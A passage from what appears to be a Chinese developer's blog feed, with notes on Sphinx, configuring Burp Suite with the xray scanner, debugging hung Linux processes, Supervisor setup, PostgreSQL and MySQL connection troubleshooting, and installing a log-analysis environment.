<p><a href="https://stackoverflow.com/questions/12391390/does-sphinx-run-my-code-on-executing-make-html">Does sphinx run my code on executing ‘make html’?</a></p>
</li>
<li class="lvl-2">
<p><a href="https://stackoverflow.com/questions/34570114/python-sphinx-the-module-executes-module-level-statement-and-it-might-call-sys/60446946#60446946">python Sphinx “the module executes module level statement and it might call sys.exit().”</a></p>
</li>
</ul>
<p>把被执行的那几个文件改成函数即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;hello world&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h3 id="找不到路径-模块">找不到路径\模块:</h3>
<p><code>conf.py</code>内多配置一下路径</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sys.path.insert(<span class="number">0</span>, os.path.abspath(<span class="string">&#x27;../../&#x27;</span>))</span><br><span class="line">sys.path.insert(<span class="number">0</span>, os.path.abspath(<span class="string">&#x27;../../../&#x27;</span>))</span><br></pre></td></tr></table></figure>
<hr />
<h1>refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://www.jianshu.com/p/d4a1347f467b">自动生成Python项目文档</a></p>
</li>
<li class="lvl-2">
<p><a href="https://kb.kutu66.com/python/post_12779396">python - python sphinx生成失败autodoc无法导入/查找模块</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.cnblogs.com/wswang/p/12145422.html">Python Sphinx使用踩坑记录</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/sinat_29957455/article/details/83657029">使用sphinx快速为你python注释生成API文档</a></p>
</li>
<li class="lvl-2">
<p><a href="http://alpha1e0.com/writing-python-comments/">如何优雅得编写python注释</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.osgeo.cn/sphinx/usage/extensions/napoleon.html">支持numpy和google风格的docstrings</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.jb51.net/article/86757.htm">Python中的多行注释文档编写风格汇总</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Dev</category>
      </categories>
      <tags>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>记录-brup&amp;xray配置使用</title>
    <url>/2019/35818.html</url>
    <content><![CDATA[<p>配置brupsuite:</p>
<p>进入 Burp 后，打开 User options 标签页，然后找到 Upstream Proxy Servers 设置。点击 Add 添加上游代理以及作用域，Destination host 处可以使用*匹配多个任意字符串，? 匹配单一任意字符串，而上游代理的地址则填写 xray 的监听地址。</p>
<p><img src="https://i.loli.net/2019/12/30/RVwlhKFkbuU6caX.png" alt="20191230160454.png" /></p>
<hr />
<p>xray powershell启动命令:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进入到exe的目录里执行</span></span><br><span class="line"> .\xray_windows_amd64.exe --log_level debug webscan --listen 127.0.0.1:7777 --html-output 1.html</span><br></pre></td></tr></table></figure>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://chaitin.github.io/xray/#/tutorial/introduce">xray 简介</a></p>
</li>
<li class="lvl-2">
<p><a href="http://www.onebug.org/sectools/75713.html">Burpsuite 与 xray 进行联动</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>SecurityTools</category>
      </categories>
      <tags>
        <tag>SecurityTools</tag>
      </tags>
  </entry>
  <entry>
    <title>记录-linux僵死进程排查过程</title>
    <url>/2019/766.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>进程卡死,在日志里看不出个所以然.</p>
<hr />
<h1>查看任务log:</h1>
<p><img src="https://i.loli.net/2019/07/23/5d369f195c02a22001.png" alt="" /></p>
<p>时间是中时区,要加8. 即为12点16分.</p>
<h1>查看进程:</h1>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -auxf | grep xxx</span><br></pre></td></tr></table></figure>
<blockquote>
<p>f：用ASCII字符显示树状结构，表达程序间的相互关系。</p>
</blockquote>
<p>进程太多的话,加上f,看起来会更清晰一些.</p>
<p><img src="https://i.loli.net/2019/07/23/5d36a09fabd4b79059.png" alt="" /></p>
<p>可以找到时间对应的那几个进程.</p>
<h1>跟踪：</h1>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 跟踪进程执行时的系统调用和所接收的信号</span></span><br><span class="line"><span class="comment"># 即它跟踪到一个进程产生的系统调用，包括参数、返回值、执行消耗的时间</span></span><br><span class="line">strace -p pid  </span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/07/23/5d36a15d2bda319560.png" alt="" /></p>
<p>然后就可以以<code>FUTEX_WAIT_PRIVATE</code>这个为线索继续去搜索.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看进程文件描述符目录</span></span><br><span class="line">ll /proc/<span class="variable">$pid</span>/fd/</span><br></pre></td></tr></table></figure>
<p>初步猜测是</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>可能进程间出现了竞争资源导致死锁,阻塞.</p>
</li>
</ul>
<p>只能继续排查了…</p>
<hr />
<h1>refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://wangchujiang.com/linux-command/c/ps.html">ps命令详解</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.cnblogs.com/migrantworkers/p/10179688.html">Linux进程僵死原因排查思路</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/u013636377/article/details/52129990">多线程程序挂起问题解决</a></p>
</li>
<li class="lvl-2">
<p><a href="http://xiaorui.cc/2014/11/18/python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E8%8E%B7%E5%8F%96%E9%98%9F%E5%88%97%E5%BC%95%E8%B5%B7%E7%A8%8B%E5%BA%8F%E6%8C%82%E8%B5%B7%E5%A0%B5%E5%A1%9E%E7%9A%84%E6%83%85%E5%86%B5/">python多线程获取队列引起程序挂起堵塞的情况</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Dev</category>
      </categories>
      <tags>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>记录-Supervisor使用</title>
    <url>/2019/25186.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>Centos7不推荐使用<code>rc.local</code>,推荐自己配<code>service</code>但因为之前用惯了Cenos6,故一开始也沿用<code>rc.local</code>.</p>
<p>后来<code>rc.local</code>启的进程会导致系统无法正常快速的<code>reboot</code>,然后就频繁断电操作(虽然是虚拟机)…导致系统的硬盘崩了…</p>
<p>为了更好的管理进程,所以选用<code>supervisor</code>这个工具.</p>
<p>理由参考这篇文章的介绍(<a href="https://my.oschina.net/goskyblue/blog/380828">进程管理工具supervisor简介及使用技巧</a>)</p>
<blockquote>
<p>经常碰到要跑一些守护进程。平常我的做法是开一个tmux软件或者screen，然后启动软件。如果有其他人问，我则会建议用<code>nohup your-program &amp;&gt;nohup.log &amp;</code>这种方式。</p>
<p>可是这种做法毕竟不是长久之计，机器重启或者不小心kill了某个进程，后台运行的这个进程可能就不小心死掉了。</p>
<p>后来开源界的大牛建议我用supervisor。尝试之后，简直是如获至宝。作为一个存在了长达10年多的进程管理软件，他已经相当成熟。</p>
</blockquote>
<hr />
<h1>Supervisor组成部分:</h1>
<ol>
<li class="lvl-3">
<p><strong>supervisord: 服务守护进程</strong>:<br />
supervisor服务器的进程名是supervisord。它主要负责在自己的调用中启动子程序，响应客户端的命令，重新启动崩溃或退出的进程，记录其子进程stdout和stderr的输出，以及生成和处理对应于子进程生命周期中的&quot;event&quot;服务器进程使用的配置文件，通常路径存放在/etc/supervisord.confa中。此配置文件是INI格式的配置文件。</p>
</li>
<li class="lvl-3">
<p><strong>supervisorctl：命令行客户端</strong>:<br />
supervisor命令行的客户端名称是supervisorctl。它为supervisord提供了一个类似于shell的交互界面。使用supervisorctl，用户可以查看不同的supervisord进程列表，获取控制子进程的状态，如停止和启动子进程</p>
</li>
<li class="lvl-3">
<p>Web Server：提供与supervisorctl功能相当的WEB操作界面一个可以通过Web界面来查看和控制进程的状态，默认监听在9091上。</p>
</li>
<li class="lvl-3">
<p>XML-RPC Interface：XML-RPC接口<br />
supervisor用于控制的XML-RPC接口</p>
</li>
</ol>
<hr />
<h1>安装&amp;初始化:</h1>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">/usr/local/bin/pip2.7 install supervisor</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 初始化配置文件</span></span><br><span class="line">/usr/local/bin/echo_supervisord_conf &gt; /xxx/supervisord.conf</span><br></pre></td></tr></table></figure>
<hr />
<h1>编辑配置文件:</h1>
<p>编辑<code>supervisord.conf</code></p>
<p>示例:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[program:program_name]</span><br><span class="line"></span><br><span class="line">command = 运行命令xxx</span><br><span class="line">autostart = true        ; 在 supervisord 启动的时候也自动启动</span><br><span class="line">startsecs = 5           ; 启动 5 秒后没有异常退出，就当作已经正常启动了</span><br><span class="line">autorestart = true      ; 程序异常退出后自动重启</span><br><span class="line">startretries = 3        ; 启动失败自动重试次数，默认是 3</span><br><span class="line">redirect_stderr = true  ; 把 stderr 重定向到 stdout，默认 false</span><br></pre></td></tr></table></figure>
<blockquote>
<p>配置项有很多…</p>
</blockquote>
<hr />
<h2 id="tips">tips:</h2>
<p><a href="https://github.com/Supervisor/supervisor/issues/980">supervisor crash when config command include java “%t %p” variable</a></p>
<p>如果在运行的命令中有用到<code>%</code>,会报格式错误.这个时候只需要双写<code>%</code>即<code>%%</code>就好了.</p>
<hr />
<h1>基本操作命令:</h1>
<h2 id="启停supervisor">启停supervisor:</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动</span></span><br><span class="line">supervisord -c /etc/supervisord.conf </span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 停止</span></span><br><span class="line">supervisorctl /etc/supervisord.conf shutdown</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 重载</span></span><br><span class="line">supervisorctl /etc/supervisord.conf reload</span><br></pre></td></tr></table></figure>
<hr />
<h2 id="管理进程">管理进程:</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动</span></span><br><span class="line">supervisorctl -c /etc/supervisord.conf start program_name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止</span></span><br><span class="line">supervisorctl -c /etc/supervisord.conf stop program_name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启</span></span><br><span class="line">supervisorctl -c /etc/supervisord.conf restart program_name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止全部进程</span></span><br><span class="line">supervisorctl -c /etc/supervisord.conf stop all</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据最新的配置文件，启动新配置或有改动的进程，配置没有改动的进程不会受影响而重启</span></span><br><span class="line">supervisorctl -c /etc/supervisord.conf update</span><br></pre></td></tr></table></figure>
<hr />
<h2 id="加入启动项">加入启动项:</h2>
<blockquote>
<p>centos7环境下</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建文件</span></span><br><span class="line">vim /usr/lib/systemd/system/supervisord.service</span><br></pre></td></tr></table></figure>
<p>文件内容:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># supervisord service for systemd (CentOS 7.0+)</span><br><span class="line"># by ET-CS (https://github.com/ET-CS)</span><br><span class="line">[Unit]</span><br><span class="line">Description=Supervisor daemon</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">ExecStart=/usr/bin/supervisord -c /etc/supervisord.conf</span><br><span class="line">ExecStop=/usr/bin/supervisorctl -c /etc/supervisord.conf shutdown</span><br><span class="line">ExecReload=/usr/bin/supervisorctl -c /etc/supervisord.conf reload</span><br><span class="line">KillMode=process</span><br><span class="line">Restart=on-failure</span><br><span class="line">RestartSec=42s</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 设置权限</span></span><br><span class="line"><span class="built_in">chmod</span> 755 /usr/lib/systemd/system/supervisord.service</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 激活开机启动命令</span></span><br><span class="line">systemctl <span class="built_in">enable</span> supervisord.service</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动supervisor进程</span></span><br><span class="line">systemctl start supervisord</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭supervisor进程</span></span><br><span class="line">systemctl stop supervisord</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果修改了supervisor.service文件，可以通过reload命令来重新加载配置文件</span></span><br><span class="line">systemctl reload supervisord</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr />
<h1>定期重启指定进程方法</h1>
<p><code>Supervisor</code>配合<code>crontab</code>可定期重启.</p>
<p>例:每小时重启进程abc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 * * * * supervisorctl -c /etc/supervisord.conf restart abc</span><br></pre></td></tr></table></figure>
<hr />
<h1>总结:</h1>
<p>初步使用的感觉是,配置起来不麻烦,要重启进程的话也很方便,不用在手打冗长的命令.</p>
<p>但是配置项不算少,要真正用得好,还是要在实践中慢慢定下适合自己程序的配置项.</p>
<p>配置项的介绍可以参考<a href="https://www.rddoc.com/doc/Supervisor/3.3.1/zh/">Supervisor文档</a></p>
<hr />
<h1>refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://blog.csdn.net/fdipzone/article/details/80146558">Supervisor定期重启指定进程</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.rddoc.com/doc/Supervisor/3.3.1/zh/">Supervisor文档</a></p>
</li>
<li class="lvl-2">
<p><a href="https://my.oschina.net/goskyblue/blog/380828">进程管理工具supervisor简介及使用技巧</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/Supervisor/supervisor/issues/980">supervisor crash when config command include java “%t %p” variable</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.jianshu.com/p/e1c3e6fbae80">在centos7上使用systemd启动supervisor</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.cnblogs.com/kevingrace/p/7525200.html">Supervisor (进程管理利器) 使用说明 - 运维笔记</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Dev</category>
      </categories>
      <tags>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>记录-uwsgi+celery+psycopg2 DB连接问题排错过程</title>
    <url>/2019/28864.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>celery的worker进程中,报错</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">  File <span class="string">&quot;/usr/local/lib/python2.7/site-packages/sqlalchemy/engine/strategies.py&quot;</span>, line <span class="number">106</span>, <span class="keyword">in</span> connect</span><br><span class="line">    <span class="keyword">return</span> dialect.connect(*cargs, **cparams)</span><br><span class="line">  File <span class="string">&quot;/usr/local/lib/python2.7/site-packages/sqlalchemy/engine/default.py&quot;</span>, line <span class="number">412</span>, <span class="keyword">in</span> connect</span><br><span class="line">    <span class="keyword">return</span> self.dbapi.connect(*cargs, **cparams)</span><br><span class="line">  File <span class="string">&quot;/usr/local/lib/python2.7/site-packages/psycopg2/__init__.py&quot;</span>, line <span class="number">130</span>, <span class="keyword">in</span> connect</span><br><span class="line">    conn = _connect(dsn, connection_factory=connection_factory, **kwasync)</span><br><span class="line">OperationalError: (psycopg2.OperationalError) could <span class="keyword">not</span> receive data <span class="keyword">from</span> server: Connection timed out</span><br><span class="line"> (Background on this error at: http://sqlalche.me/e/e3q8)</span><br></pre></td></tr></table></figure>
<p>连接超时,无法取得数据.</p>
<hr />
<h1>Debug思路:</h1>
<h2 id="1-连接数">1.连接数:</h2>
<p>看到报错 <code>could not receive data from server: Connection timed out</code></p>
<p>一开始觉得是最大连接数的问题.</p>
<p>因为别的正在泡的应用会用<code>pool_size=100</code>的连接池去连接<code>postgresql</code>里的某个数据库,</p>
<p>查询最大连接数<code>show max_connections;</code></p>
<p><img src="https://i.loli.net/2019/05/30/5cef801e4f8e874593.png" alt="" /></p>
<blockquote>
<p>最大连接连接数默认才100,那么<code>pool_size=100</code>的连接池去连接的话会全部占用了吧…</p>
</blockquote>
<p>再继续查询</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> max_conn,used,res_for_super,max_conn<span class="operator">-</span>used<span class="operator">-</span>res_for_super res_for_normal </span><br><span class="line"><span class="keyword">from</span> </span><br><span class="line">  (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) used <span class="keyword">from</span> pg_stat_activity) t1,</span><br><span class="line">  (<span class="keyword">select</span> setting::<span class="type">int</span> res_for_super <span class="keyword">from</span> pg_settings <span class="keyword">where</span> name<span class="operator">=</span>$$superuser_reserved_connections$$) t2,</span><br><span class="line">  (<span class="keyword">select</span> setting::<span class="type">int</span> max_conn <span class="keyword">from</span> pg_settings <span class="keyword">where</span> name<span class="operator">=</span>$$max_connections$$) t3</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/05/30/5cef80989906427300.png" alt="" /></p>
<p>实际上,并非连接数被占满了,还是有空余的连接数的.</p>
<p>既然还有剩余的,那我这个应用把连接池的<code>pool_size</code>改为<code>10</code>,应该能正常连接上吧.</p>
<p>修改之后,还是报同样的错误不行.</p>
<hr />
<p>搜索了一下,然后根据这个链接<a href="https://stackoverflow.com/questions/37612800/postgresql-connection-timed-out-operationalerror-on-django-and-new-server">PostgreSQL Connection Timed Out OperationalError on Django and new server</a></p>
<p>继续排错:</p>
<blockquote>
<p>连接超时错误表明无法通过网络上的设置访问数据库服务器，其方式不会立即返回错误。</p>
<p>根据我的经验，最好的方法是分别对连接的两侧进行故障排除。这意味着首先从psql命令行测试连接的服务器端，然后在解析后测试django端。</p>
</blockquote>
<hr />
<ol>
<li class="lvl-3">
<p>你能从服务器ping服务器吗？如果没有，请从故障排除网络开始</p>
</li>
</ol>
<p><img src="https://i.loli.net/2019/05/30/5cef8390689c218268.png" alt="" /></p>
<blockquote>
<p>ping 第一个网段的ip 发现会丢包…有点奇怪…</p>
</blockquote>
<p>ping另一个网段的ip</p>
<p><img src="https://i.loli.net/2019/05/30/5cef85fa2890d42171.png" alt="" /></p>
<blockquote>
<p>不会丢包.难道要用另一个网段的ip来建立数据库连接?</p>
</blockquote>
<hr />
<ol start="2">
<li class="lvl-3">
<p>你可以使用相同的端口，IP地址等通过psql连接到服务器吗？如果超时，您可能需要检查防火墙和postgresql配置</p>
</li>
</ol>
<p>查看postgre 数据库所在的服务器的防火墙设置.发现也正常.</p>
<p>在客户端写了个简单的脚本,发现也连接正常.<br />
<img src="https://i.loli.net/2019/05/30/5cef8456dc52c19819.png" alt="" /></p>
<hr />
<h1>真正的问题:</h1>
<p>最终发现.用来连接数据库的内网ip冲突了…</p>
<p>omg…</p>
<hr />
<h1>refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://www.cnblogs.com/xiangnan/p/10051240.html">科学地增加postgresql最大连接数</a></p>
</li>
<li class="lvl-2">
<p><a href="https://docs.sqlalchemy.org/en/13/core/pooling.html#pool-disconnects">SQLAlchemy 1.3文档-连接池</a></p>
</li>
<li class="lvl-2">
<p><a href="https://stackoverflow.com/questions/37612800/postgresql-connection-timed-out-operationalerror-on-django-and-new-server">PostgreSQL Connection Timed Out OperationalError on Django and new server</a></p>
</li>
<li class="lvl-2">
<p><a href="http://lists.unbit.it/pipermail/uwsgi/2011-May/002080.html">[uWSGI] Sporadic sqlalchemy errors when using Pylons app with multiple workers</a></p>
</li>
<li class="lvl-2">
<p><a href="http://lists.unbit.it/pipermail/uwsgi/2011-May/002078.html">[uWSGI] Sporadic sqlalchemy errors when using Pylons app with multiple workers</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/heroku-python/django-postgrespool/issues/3">Celery jobs throw exceptions #3</a></p>
</li>
<li class="lvl-2">
<p><a href="http://jorgenmodin.net/index_html/process-safe-connection-pool-for-psycopg2-postgresql">rocess safe connection pool for psycopg2 (postgresql)</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Dev</category>
      </categories>
      <tags>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>记录-修改Mysql最大连接数</title>
    <url>/2019/63948.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>之前常遇到<code>mysql gone away</code>这类错误,由于用的是<code>sqlalchemy</code>里的<code>Null Pool</code>.即不使用连接池。</p>
<blockquote>
<p>按道理来说,要选用连接池的,但由于还没找到<code>sqlalchemy</code>连接池与celery多进程的最佳实践,故暂时搁置这个方案…</p>
</blockquote>
<p>这样的话,每次在执行sql语句的时候,都会跟数据库建立链接,执行结束后,再释放连接.</p>
<p>这样在高并发的情况下会频繁连接数据库，占用很多连接数.</p>
<p>所以这个时候要适当增大mysql的最大连接数.</p>
<hr />
<h1>查询:</h1>
<p>查询最大连接数</p>
<p><code>show variables like '%max_connections%';</code></p>
<p>历史最大连接数量</p>
<p><code>show global status like 'Max_used_connections';</code></p>
<hr />
<h1>修改最大连接数:</h1>
<h2 id="修改mysql配置文件">修改mysql配置文件:</h2>
<blockquote>
<p>环境:Centos7</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/my.cnf</span><br></pre></td></tr></table></figure>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[mysqld]</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Remove leading # and set to the amount of RAM for the most important data</span></span><br><span class="line"><span class="comment"># cache in MySQL. Start at 70% of total RAM for dedicated server, else 10%.</span></span><br><span class="line"><span class="comment"># innodb_buffer_pool_size = 128M</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Remove leading # to turn on a very important data integrity option: logging</span></span><br><span class="line"><span class="comment"># changes to the binary log between backups.</span></span><br><span class="line"><span class="comment"># log_bin</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Remove leading # to set options mainly useful for reporting servers.</span></span><br><span class="line"><span class="comment"># The server defaults are faster for transactions and fast SELECTs.</span></span><br><span class="line"><span class="comment"># Adjust sizes as needed, experiment to find the optimal values.</span></span><br><span class="line"><span class="comment"># join_buffer_size = 128M</span></span><br><span class="line"><span class="comment"># sort_buffer_size = 2M</span></span><br><span class="line"><span class="comment"># read_rnd_buffer_size = 2M</span></span><br><span class="line"><span class="attr">datadir</span>=/var/lib/mysql</span><br><span class="line"><span class="attr">socket</span>=/var/lib/mysql/mysql.sock</span><br><span class="line"></span><br><span class="line"><span class="attr">port</span>=<span class="number">33066</span></span><br><span class="line"></span><br><span class="line"><span class="attr">max_connections</span>=<span class="number">500</span></span><br><span class="line"><span class="attr">max_allowed_packet</span> = <span class="number">512</span>M</span><br><span class="line"><span class="comment">#query_cache_limit = 4M</span></span><br><span class="line"><span class="attr">wait_timeout</span> = <span class="number">288000</span></span><br><span class="line"><span class="attr">interactive_timeout</span> = <span class="number">288000</span></span><br><span class="line"><span class="attr">read_buffer_size</span> = <span class="number">16</span>M</span><br><span class="line"></span><br><span class="line"><span class="comment"># Disabling symbolic-links is recommended to prevent assorted security risks</span></span><br><span class="line"><span class="attr">symbolic-links</span>=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Recommended in standard MySQL setup</span></span><br><span class="line"><span class="attr">sql_mode</span>=STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION</span><br><span class="line"></span><br><span class="line"><span class="section">[mysqld_safe]</span></span><br><span class="line"><span class="attr">log-error</span>=/var/log/mysqld.log</span><br><span class="line"><span class="attr">pid-file</span>=/var/run/mysqld/mysqld.pid</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p>第一次只修改了配置文件,也没有及时验证有无修改成功.才发现改了配置文件还不够,还需要继续往下修改.</p>
</blockquote>
<hr />
<h2 id="配置limits-conf">配置limits.conf:</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/security/limits.conf</span><br><span class="line"><span class="comment">#  添加mysql用户配置</span></span><br><span class="line">mysql hard nofile 65535</span><br><span class="line">mysql soft nofile 65535</span><br></pre></td></tr></table></figure>
<hr />
<h2 id="配置mariadb-service">配置mariadb.service:</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /usr/lib/systemd/system/mysqld.service</span><br><span class="line"><span class="comment"># 添加参数</span></span><br><span class="line">LimitNOFILE=65535</span><br></pre></td></tr></table></figure>
<hr />
<h2 id="重启">重启</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 重启mysql</span></span><br><span class="line">service mysqld restart</span><br></pre></td></tr></table></figure>
<hr />
<h1>总结:</h1>
<p>之前在解决类似的数据库错误的时候,确实是比较难定位到具体的原因.</p>
<p><a href="https://stackoverflow.com/questions/37612800/postgresql-connection-timed-out-operationalerror-on-django-and-new-server">PostgreSQL Connection Timed Out OperationalError on Django and new server</a></p>
<blockquote>
<p>连接超时错误表明无法通过网络上的设置访问数据库服务器，其方式不会立即返回错误。</p>
<p>根据我的经验，最好的方法是分别对连接的两侧进行故障排除。这意味着首先从psql命令行测试连接的服务器端，然后在解析后测试django端。</p>
</blockquote>
<p>最好的方法是对涉及到组件(元素)一一去排查原因,不要一直想当然的陷入到代码里.那样会只见树不见林…</p>
<hr />
<h1>refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://www.cnblogs.com/phpper/p/9570792.html">Mysql 连接数,最大并发数设置</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/u014074757/article/details/80527445">MySQL配置max_connections无效</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.cnblogs.com/langdashu/p/5889352.html">MySQL配置文件my.cnf的理解</a></p>
</li>
<li class="lvl-2">
<p><a href="https://dev.mysql.com/doc/refman/8.0/en">MySQL 8.0参考手册</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Dev</category>
      </categories>
      <tags>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>记录-日志分析环境搭建</title>
    <url>/2018/61175.html</url>
    <content><![CDATA[<h1>下载&amp;安装：</h1>
<h2 id="java1-8">java1.8:</h2>
<p>卸载：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># rpm -qa|grep java           ／／ 查看jdk的信息</span><br></pre></td></tr></table></figure>
<p>一般将获得如下信息：<br />
java-1.4.2-gcj-compat-1.4.2.0-40jpp.115<br />
java-1.6.0-openjdk-1.6.0.0-1.7.b09.el5</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># yum -y remove java java-1.4.2-gcj-compat-1.4.2.0-40jpp.115／／ 卸载  </span><br><span class="line">yum -y remove  java-1.6.0-openjdk-1.6.0.0-1.7.b09.el5</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget --no-cookies --no-check-certificate --header &quot;Cookie: gpw_e24=http%3A%2F%2Fwww.oracle.com%2F; oraclelicense=accept-securebackup-cookie&quot; &quot;http://download.oracle.com/otn-pub/java/jdk/8u161-b12/2f38c3b165be4555a1fa6e98c45e0808/jdk-8u161-linux-x64.rpm&quot;</span><br></pre></td></tr></table></figure>
<hr />
<h2 id="xampp">xampp:</h2>
<p><a href="https://www.cnblogs.com/caicaizi/p/5107834.html">原创）CentOS6.4下安装xampp（一定要在linux上下载）</a></p>
<p><a href="zerfew.blog.163.com/blog/static/193810169201511224353649/">RedHat中xampp的lampp开启失败提示“aaa proftpd[48908]⚠️ unable to determine IP address of ‘aaa’”解决办法</a></p>
<hr />
<p>dvwa环境:<code>http://192.168.199.244:8080/dvwa/index.php</code></p>
<hr />
<h2 id="Elasticsearch">Elasticsearch:</h2>
<p><code>wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-5.6.1.rpm </code></p>
<p><code>sudo rpm --install elasticsearch-5.6.1.rpm </code></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="www.cnblogs.com/yswenli/p/6397351.html">centos 7安装es 及异常处理</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/feinifi/article/details/73633235?utm_source=itdadao&amp;utm_medium=referral">elasticsearch启动错误</a></p>
</li>
</ul>
<hr />
<h3 id="ElasticSearch分词器设置">ElasticSearch分词器设置</h3>
<p><code>http://192.168.0.38:9200/_template/web_apache_template</code></p>
